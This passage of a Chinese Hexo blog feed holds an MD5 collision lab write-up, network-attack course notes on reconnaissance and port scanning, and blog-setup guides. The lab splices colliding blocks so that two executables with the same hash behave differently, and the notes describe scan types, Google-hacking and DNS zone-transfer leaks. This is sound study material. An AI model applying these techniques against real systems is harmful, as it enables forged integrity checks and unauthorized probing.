class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i] != b[i])<br>        &#123;<br>            flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(flag)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is benign code!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is malicious code!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032660.png"alt="image-20230927202354382" /><figcaption aria-hidden="true">image-20230927202354382</figcaption></figure></li><li><p>使用bless查看task4.out文件，先找到数组位置，第一个数组开始位置为0x3020，从而得到前缀结束位置：0x3040（由于0x3020不是64的倍数，需扩展到64的倍数），对应10进制数为12352。因此，前缀中包含了32个’A’。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032661.png"alt="image-20230927202409522" /><figcaption aria-hidden="true">image-20230927202409522</figcaption></figure></li><li><p>截取前缀部分，作为task4_prefix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032662.png"alt="image-20230927202421078" /><figcaption aria-hidden="true">image-20230927202421078</figcaption></figure></li><li><p>根据该前缀生成两个具有相同 MD5 哈希值的文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032663.png"alt="image-20230927202429531" /><figcaption aria-hidden="true">image-20230927202429531</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032664.png"alt="image-20230927202441720" /><figcaption aria-hidden="true">image-20230927202441720</figcaption></figure></li><li><p>从GCC处开始（0x31c8），截取剩余部分，作为task4_suffix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032665.png"alt="image-20230927202455398" /><figcaption aria-hidden="true">image-20230927202455398</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032666.png"alt="image-20230927202503922" /><figcaption aria-hidden="true">image-20230927202503922</figcaption></figure></li><li><p>把步骤4中生成的其中一个文件的后160个字节（32(字符A)+128(Padding)）截取出来，作为task4_middle文件的输入。根据代码逻辑，被选取出的文件在拼接成为一个可执行文件后，将执行善意代码，此处我们选取task4_out1.bin。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032667.png"alt="image-20230927202526131" /><figcaption aria-hidden="true">image-20230927202526131</figcaption></figure></li><li><p>数组大小为200字节，因此还需要40字节的字符串,保存至task4_0xA。并且注意到，两个数组间有24字节的0x00字符，保存至task4_str0。特别注意：python生成时会在末尾自动加上0x0A，因此我们对生成的文件进行截取。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032668.png"alt="image-20230927202538212" /><figcaption aria-hidden="true">image-20230927202538212</figcaption></figure></li><li><p>按下表方式开始进行拼接（拼接过程中要维持编译文件原有结构，但拼接方式不唯一）：</p><table><thead><tr class="header"><th>前缀输出文件</th><th>数组a补充（40字节）</th><th>间隔（24字节）</th><th>数组b主体（160字节）</th><th>数组b补充（40字节）</th><th>后缀</th></tr></thead><tbody><tr class="odd"><td>task4_out1.bin</td><td>task4_strA</td><td>task4_str0</td><td>task4_middle</td><td>task4_strA</td><td>task4_suffix</td></tr><tr class="even"><td>task4_out2.bin</td><td>task4_strA</td><td>task4_str0</td><td>task4_middle</td><td>task4_strA</td><td>task4_suffix</td></tr></tbody></table><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032669.png"alt="image-20230927202618655" /><figcaption aria-hidden="true">image-20230927202618655</figcaption></figure></li><li><p>分别运行两个最终文件（task4_1/task4_2），此处需要先赋予执行权限。与之前推理结果一致，task4_1执行善意代码，task4_2执行恶意代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032670.png"alt="image-20230927202628947" /><figcaption aria-hidden="true">image-20230927202628947</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032671.png"alt="image-20230927202638045" /><figcaption aria-hidden="true">image-20230927202638045</figcaption></figure></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/26/网络攻防-口令攻击/#实验-MD5碰撞">网络攻防-口令攻击- Sean's Blog (seanxz401.github.io)</a></li><li>https://www.cnblogs.com/skprimin/p/16177784.html</li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Cryptography</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH2-信息收集技术</title>
    <link href="/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/02%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/02%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集概述">2.1 信息收集概述</h1><h2 id="信息收集的内容">2.1.1 信息收集的内容</h2><ul><li>定义：信息收集是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动</li><li>内容：域名和IP地址；操作系统类型；开放端口；提供开放端口的服务或应用程序；防火墙、入侵检测等安全防范措施</li><li>分类：<ul><li>主动：通过直接访问、扫描网站，这种将流量流经网站的行为</li><li>被动：利用第三方的服务对目标进行访问了解，比例：Google搜索</li></ul></li></ul><h2 id="信息收集的方法">2.1.2 信息收集的方法</h2><ul><li>社会工程学</li><li>技术手段：公开信息收集、网络扫描、漏洞扫描、网络拓扑检测</li></ul><h1 id="公开信息收集">2.2 公开信息收集</h1><h2 id="利用web服务">2.2.1 利用web服务</h2><ul><li><p>网站公开邮箱（结合社会工程学）</p></li><li><p>目标域名、IP地址、网站模板、网络管理员信息、公司人员名单</p></li><li><p>网络拓扑结构图</p></li></ul><h2 id="利用搜索引擎服务">2.2.2 利用搜索引擎服务</h2><ul><li><p>基本语法</p><table><thead><tr class="header"><th><strong>And</strong></th><th><strong>与</strong></th></tr></thead><tbody><tr class="odd"><td><strong>OR</strong></td><td><strong>或</strong></td></tr><tr class="even"><td><strong>+</strong></td><td><strong>强制包含搜索项</strong></td></tr><tr class="odd"><td><strong>-</strong></td><td><strong>非，去掉搜索项</strong></td></tr><tr class="even"><td><strong>“”</strong></td><td><strong>包含一个完整的语义</strong></td></tr><tr class="odd"><td><strong>.</strong></td><td><strong>单个通配符</strong></td></tr><tr class="even"><td>*****</td><td><strong>任意通配符</strong></td></tr></tbody></table></li><li><p>搜索语法</p><table><thead><tr class="header"><th><strong>site</strong></th><th><strong>搜索具体服务器或域名的网页</strong></th></tr></thead><tbody><tr class="odd"><td><strong>filetype</strong></td><td><strong>搜索特定类型的文件</strong></td></tr><tr class="even"><td><strong>intitle</strong></td><td><strong>搜索网页标题</strong></td></tr><tr class="odd"><td><strong>inurl</strong></td><td><strong>搜索URL </strong></td></tr><tr class="even"><td><strong>intext</strong></td><td><strong>搜索正文</strong></td></tr><tr class="odd"><td><strong>link</strong></td><td><strong>搜索连接到指定网页的网页</strong></td></tr></tbody></table></li><li><p>https://zhuanlan.zhihu.com/p/142832509（谷歌黑客常用搜索语句一览）</p></li><li><p>搜索引擎：https://www.shodan.io/</p></li></ul><h2 id="利用whole服务">2.2.3 利用Whole服务</h2><ul><li>功能：查看已注册域名（域名登记人信息、联系电话和邮箱、域名注册时间和更新时间、权威DNS的IP地址）</li><li>使用方法：https://whois.chinaz.com/</li></ul><h2 id="利用dns域名服务">2.2.4 利用DNS域名服务</h2><ul><li>主服务器</li><li>辅助服务器（定期进行区域传送：允许一个辅域名服务器更新自己的区域数据）</li><li>缓存服务器</li></ul><p><strong>利用思路</strong>：</p><p>如果DNS配置不当，可能造成内部主机名和IP地址对的泄漏。即主DNS服务器允许任意IP地址从该服务器进行区域传送，进而泄露信息。</p><h2 id="cdn">2.2.5 CDN</h2><p>内容分发网络<code>CDN</code>是一个互连服务器网络，可加快数据密集型应用程序的网页加载速度。<code>CDN</code>可以表示内容分发网络或内容分配网络。当用户访问某个网站时，来自该网站服务器的数据必须通过互联网传输到用户的计算机。如果用户距离该服务器较远，则加载大文件（例如视频或网站图像）将需要很长时间。相反，如果网站内容存储在距离用户较近的<code>CDN</code>服务器上，就可以更快到达他们的计算机。</p><h1 id="网络扫描">2.3 网络扫描</h1><h2 id="主机扫描">2.3.1 主机扫描</h2><h3 id="icmp扫描">2.3.1.1 ICMP扫描</h3><p><strong>ping扫描原理</strong>：</p><p>利用<code>ICMP协议</code>（响应请求/应答）进行工作</p><p><strong><code>ICMP</code>报文格式：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014073.png"alt="image-20230920161113121" /><figcaption aria-hidden="true">image-20230920161113121</figcaption></figure><p>类型域指明类型；代码域指明作用</p><p><strong>常见<code>ICMP</code>报文：</strong></p><table><thead><tr class="header"><th><strong>名称</strong></th><th><strong>类型</strong></th></tr></thead><tbody><tr class="odd"><td><strong><code>ICMP</code> DestinationUnreachable（目标不可达）</strong></td><td><strong>3</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> Source Quench</strong><strong>（源抑制）</strong></td><td><strong>4</strong></td></tr><tr class="odd"><td><strong><code>ICMP</code> Redirection（重定向）</strong></td><td><strong>5</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> TimestampRequest/Reply（时间戳）</strong></td><td><strong>13/14</strong></td></tr><tr class="odd"><td><strong><code>ICMP</code> Address MaskRequest/Reply（子网掩码）</strong></td><td><strong>17/18</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> EchoRequest/Reply（响应请求/应答）</strong></td><td><strong>8/0</strong></td></tr></tbody></table><p>注：根据RFC的定义，<code>TCP/IP</code>协议栈应该支持各种类型的<code>ICMP</code>报文。但事实上，在各个操作系统具体实现TCP/IP时，可能并没有完全遵循RFC标准。</p><h3 id="其他类型的主机扫描">2.3.1.2 其他类型的主机扫描</h3><ul><li>构造异常的<code>IP</code>包头</li><li>在<code>IP</code>头中设置无效的字段值</li><li>构造错误的数据分片</li><li>通过超长包探测内部路由器</li><li>反向映射探测</li></ul><h2 id="端口扫描">2.3.2 端口扫描</h2><p>参阅：https://nmap.org/man/zh/man-port-scanning-techniques.html</p><h3 id="connect扫描">2.3.2.1 Connect扫描</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014075.png"alt="image-20230920162546395" /><figcaption aria-hidden="true">image-20230920162546395</figcaption></figure><ul><li>即TCP Connect扫描。左边为服务端，右边为客户端。</li><li>优点：实现简单、可以用普通用户权限执行</li><li>缺点：容易被目标应用日志所记录</li></ul><h3 id="syn扫描和fin扫描">2.3.2.2 SYN扫描和FIN扫描</h3><p><strong>SYN扫描</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014076.png"alt="image-20230920163233117" /><figcaption aria-hidden="true">image-20230920163233117</figcaption></figure><ul><li>半连接扫描基于TCP三次握手规则，探测服务端口是否开放。</li><li>服务端口开放，会返回<code>SYN/ACK</code>消息</li><li>服务端口关闭，会返回<code>RST</code>消息</li><li>如果数次重发后仍没响应，该端口就被标记为被过滤。如果收到<code>ICMP</code>不可到达错误(类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</li><li>优点：一般不会被目标主机的应用所记录</li><li>缺点：运行Raw Socket时必须拥有管理员权限</li></ul><p><strong>FIN扫描</strong></p><ul><li>假设扫描系统遵循RFC标准，如果收到一个<code>RST</code>报文，该端口被认为是closed(关闭的)</li><li>没有响应则意味着端口是open|filtered(开放或者被过滤的)</li><li>如果收到<code>ICMP</code>不可到达错误(类型 3，代号1，2，3，9，10，或者13)，该端口就被标记为被过滤的。</li><li>优点：它们能躲过一些无状态防火墙和报文过滤路由器，不会被记录到日志</li><li>缺点：大部分系统并不遵循该标准</li><li>FIN扫描 (-sF)：只设置<code>TCP FIN</code>标志位。</li><li>Null扫描 (-sN)：不设置任何标志位(tcp标志头是0)</li><li>Xmas扫描(-sX)：设置<code>FIN</code>，<code>PSH</code>，和<code>URG</code>标志位</li><li>除了探测报文的标志位不同，这三种扫描在行为上完全一致。</li></ul><h3 id="其他端口扫描技术">2.3.2.3 其他端口扫描技术</h3><ul><li><code>ACK</code>扫描：向目标主机的端口发送<code>ACK</code>包，如果收到<code>RST</code>包，说明该端口没有被防火墙屏蔽；不响应的端口或者发送特定的<code>ICMP</code>错误消息(类型3，代号1，2，3，9，10，或者13)的端口，标记为 filtered(被过滤的)。</li><li><code>IP</code>分段扫描</li><li>TCP FTP Proxy扫描</li></ul><h3 id="udp扫描">2.3.2.4 UDP扫描</h3><p>只需向目标主机<code>UDP</code>端口发送任意数据，如果端口没有开放，则返回一个“目标不可达”的<code>ICMP</code>报文</p><h2 id="系统类型扫描">2.3.3 系统类型扫描</h2><h3 id="利用端口扫描结果">2.3.3.1 利用端口扫描结果</h3><ul><li>由于现代操作系统往往提供一些自身特有的功能，而这些功能又很可能打开一些特定的端口</li><li>windows：135，137，139等</li><li>Lniux：512，513，514，2049等</li></ul><h3 id="利用banner">2.3.3.2 利用Banner</h3><p>服务程序接收到客户端的正常连接后所给出的欢迎信息</p><h3 id="tcpip协议栈指纹">2.3.3.3 TCP/IP协议栈指纹</h3><ul><li>不同的操作系统在实现<code>TCP/IP</code>协议栈时都或多或少地存在着差异。而这些差异，我们就称之为<code>TCP/IP</code>协议栈指纹</li><li>TCP指纹：<code>FIN</code>探测、<code>BOGUS</code>标记位探测、<code>SYN</code>泛洪测试等</li><li><code>IP</code>、<code>ICMP</code>指纹：<code>ICMP</code>错误信息查询、<code>ICMP</code>信息引用、<code>TOS</code>和<code>TTL</code></li></ul><h1 id="漏洞扫描">2.4 漏洞扫描</h1><h2 id="概念">2.4.1 概念</h2><ul><li><p>漏洞：在计算机安全领域，安全漏洞<code>SecurityHole</code>通常又称作脆弱性（vulnerability）</p></li><li><p>来源：</p><p>（1）硬件、软件或协议设计时的瑕疵 （2）硬件、软件或协议实现中的弱点（3）硬件、软件本身的瑕疵 （4）系统和网络的错误配置</p></li><li><p>漏洞扫描：指利用一些专门或综合漏洞扫描程序对目标存在的系统漏洞或应用程序漏洞进行扫描。</p></li></ul><h2 id="分类">2.4.2 分类</h2><ul><li>主动式策略是<strong>基于网络</strong>的检测，通过执行一些脚本文件对系统进行攻击，并记录它的反应，从而发现其中的漏洞</li><li>被动式策略是<strong>基于主机</strong>的检测，对系统中不合适的设置、脆弱的口令以及其他同安全规则相抵触的对象进行检查</li></ul><h2 id="方法">2.4.3 方法</h2><ul><li>直接测试：指利用漏洞特点发现系统漏洞的方法</li><li>推断：它并不直接渗透漏洞，只是间接地寻找漏洞存在的证据。采用推断方法的检测手段主要有版本检查、程序行为分析、操作系统堆栈指纹分析和时序分析等。</li><li>带凭证的测试：凭证是指访问服务所需要的用户名或者密码，包括UNIX的登录权限和从网络调用WindowsNT的<code>API</code>的能力。如果赋予测试进程目标系统的角色，将能够检查出更多的漏洞。</li></ul><h1 id="网络拓扑探测">2.5 网络拓扑探测</h1><h2 id="拓扑探测">2.5.1 拓扑探测</h2><ul><li><code>Traceroute</code>：<code>UDP</code>数据包、<code>TTL</code></li><li><code>SNMP</code>（简单网络管理协议）：不同类型网络设备之间客户机/服务器模式的简单通信协议<ul><li>Read：观察设备配置信息</li><li>Read/Write：有权写入信息</li></ul></li></ul><h2 id="网络设备识别">2.5.2 网络设备识别</h2><h3 id="利用专门搜索引擎">2.5.2.1 利用专门搜索引擎</h3><p>https://www.shodan.io/</p><p>https://www.zoomeye.org/</p><h3 id="基于设备指纹的设备类型探测">2.5.2.2基于设备指纹的设备类型探测</h3><p>主要介绍基于应用服务Banner的设备识别技术：</p><ul><li>FTP协议</li><li>SSH</li><li>Telnet</li><li>HTTP</li></ul><h3 id="网络实体ip地理位置定位">2.5.2.3 网络实体IP地理位置定位</h3><ul><li>基于查询信息的定位：通过查询机构注册的信息确定网络设备的地理位置</li><li>基于网络测量的定位：利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH1-网络攻击概述</title>
    <link href="/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/01%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/01%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="网络安全威胁">1.1 网络安全威胁</h1><h2 id="事件">1.1.1 事件</h2><h2 id="成因">1.1.2 成因</h2><ul><li>技术因素<ul><li>协议缺陷：网络协议缺乏认证、加密等基本的安全特性</li><li>软件漏洞：软件规模庞大，复杂度提高，开发者安全知识缺乏</li><li>策略弱点：安全需求与应用需求不相一致，安全策略设计不当</li><li>硬件漏洞：硬件设计软件化使得软件漏洞同样出现在硬件之中</li></ul></li><li>人为因素<ul><li>攻击者：成分复杂，多数掌握着丰富的攻击资源</li><li>防御者：广大的网络应用人群缺少安全知识，专业人员数量、质量尚难满足对安全人才的迫切需求</li></ul></li></ul><h1 id="网络攻击技术">1.2 网络攻击技术</h1><h2 id="分类">1.2.1 分类</h2><ul><li>本地（物理）攻击：指攻击者通过实际接触被攻击的主机实施的各种攻击方法</li><li>主动攻击：指攻击者利用Web、FTP、Telnet等开放网络服务对目标实施的各种攻击</li><li>被动攻击：攻击者利用浏览器、邮件接收程序、文字处理程序等客户端应用程序漏洞或系统用户弱点，对目标实施的各种攻击</li><li>中间人攻击：指攻击者处于被攻击主机的某个网络应用的中间人位置，进行数据窃听、破坏或篡改等攻击</li></ul><p>注：主动与被动，主要是看是否需要对方采取动作</p><h2 id="步骤与方法">1.2.2 步骤与方法</h2><ul><li>信息收集</li><li>权限获取</li><li>安装后门</li><li>扩大影响</li><li>清除痕迹</li></ul><h1 id="网络攻击的发展趋势">1.3 网络攻击的发展趋势</h1><ul><li>攻击影响日益深远</li><li>攻击领域不断扩展</li><li>攻击技术愈加精细</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitHub+PicGo搭建免费图床</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="操作步骤">1. 操作步骤</h1><h2 id="github">1.1 Github</h2><ul><li><p>新建仓库（注：必须为Public，勾选<code>Add a README file</code>）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654111.png"alt="image-20230923153333076" /><figcaption aria-hidden="true">image-20230923153333076</figcaption></figure></li><li><p>生成token：点击<code>Github</code>右上角的用户头→<code>Settings</code>→<code>Developer settiings</code>→<code>Personal access tokens</code>→<code>Tokens(classic)</code>→<code>Generate new token</code>，在<code>Note</code>一栏输入创建的仓库名称，并勾选<code>repo</code>，最后在最下方点击<code>Generate token</code>按钮，就生成了对应的<code>Token</code>。注：新生成的<code>Token</code>只会显示一次，请妥善保存，如有遗失，重新生成即可。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654112.png"alt="image-20230923154939730" /><figcaption aria-hidden="true">image-20230923154939730</figcaption></figure></li></ul><h2 id="picgo">1.2 PicGo</h2><ul><li><p>下载PicGo所需版本</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654113.png"alt="image-20230923155129734" /><figcaption aria-hidden="true">image-20230923155129734</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654114.png"alt="image-20230923155430395" /><figcaption aria-hidden="true">image-20230923155430395</figcaption></figure></li><li><p>安装（略）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654115.png"alt="image-20230923155604890" /><figcaption aria-hidden="true">image-20230923155604890</figcaption></figure></li><li><p>配置</p><ul><li><p>为显示简捷，仅勾选GitHub</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654116.png"alt="image-20230923155808379" /><figcaption aria-hidden="true">image-20230923155808379</figcaption></figure></li><li><p><strong>特别注意</strong>：设定仓库名为账户+仓库名；自定义域名需要自己有域名才填写</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654117.png"alt="image-20230923165104951" /><figcaption aria-hidden="true">image-20230923165104951</figcaption></figure></li><li><p>点击<code>设为默认图床</code>，点击<code>确定</code></p></li></ul></li></ul><h2 id="typora">1.3 Typora</h2><p><code>文件</code>→<code>偏好设置</code>→<code>图像</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654118.png"alt="image-20230923163344947" /><figcaption aria-hidden="true">image-20230923163344947</figcaption></figure><h1 id="使用方法">2. 使用方法</h1><p>Typora：<code>格式</code>→<code>图像</code>→<code>上传所有本地图片</code></p><p>参考教程：</p><ol type="1"><li><ahref="https://cnhuazhu.top/butterfly/2021/02/20/GitHub+PicGo+jsDelivr搭建免费图床/">GitHub+PicGo+jsDelivr搭建免费图床| 花猪のBlog (cnhuazhu.top)</a></li><li>https://juejin.cn/post/6992451980379553828</li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fluid主题配置指南</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/Fluid%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/Fluid%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="关于指南">1. 关于指南</h1><ul><li>本指南中提到的："<strong>站点配置</strong>" 指的 Hexo 博客目录下的<code>_config.yml</code>，"<strong>主题配置</strong>" 指的是<code>theme/fluid/_config.yml</code> 或者 <code>_config.fluid.yml</code>，注意区分；</li><li>本指南中提到的 <code>source</code> 目录都指的是博客目录下的<code>source</code> 文件夹，不推荐修改主题内 <code>source</code>目录；</li></ul><h1 id="全局">2. 全局</h1><h2 id="覆盖配置">2.1 覆盖配置</h2><ul><li><p>在博客根目录下创建 <code>_config.fluid.yml</code> 文件，将主题的<code>_config.yml</code>（不是根目录下的<code>_config.yml</code>）全部配置复制过去，以后如果修改任何主题配置，都只需修改<code>_config.fluid.yml</code> 的配置即可；</p></li><li><p>只要存在于 <code>_config.fluid.yml</code>的配置都是高优先级，修改原 <code>_config.yml</code> 是无效的;</p></li><li><p>每次更新主题可能存在配置变更，请注意更新说明，可能需要手动对<code>_config.fluid.yml</code> 同步修改;</p></li><li><p>想查看覆盖配置有没有生效，可以通过 <code>hexo g --debug</code>查看命令行输出;</p></li><li><p>如果想将某些配置覆盖为空，注意不要把主键删掉，不然是无法覆盖的，比如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">icons:</span>  <span class="hljs-comment"># 不要把 icon 注释掉，否则无法覆盖配置</span><br>    <span class="hljs-comment"># - &#123; class: &#x27;iconfont icon-github-fill&#x27;, link: &#x27;https://github.com&#x27; &#125;</span><br>    <span class="hljs-comment"># - &#123; class: &#x27;iconfont icon-wechat-fill&#x27;, qrcode: &#x27;/img/favicon.png&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="博客标题">2.2 博客标题</h2><p>页面左上角的博客标题，默认使用<strong>站点配置</strong>中的<code>title</code>，这个配置同时控制着网页在浏览器标签中的标题。如需单独区别设置，可在<strong>主题配置</strong>中设置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 导航栏的相关配置</span><br><span class="hljs-comment"># Navigation bar</span><br><span class="hljs-attr">navbar:</span><br>  <span class="hljs-comment"># 导航栏左侧的标题，为空则按 hexo config 中 `title` 显示</span><br>  <span class="hljs-comment"># The title on the left side of the navigation bar. If empty, it is based on `title` in hexo config</span><br>  <span class="hljs-attr">blog_title:</span> <span class="hljs-string">&quot;kaikaikai&#x27;s blog&quot;</span><br></code></pre></td></tr></table></figure><h2 id="导航菜单">2.3 导航菜单</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 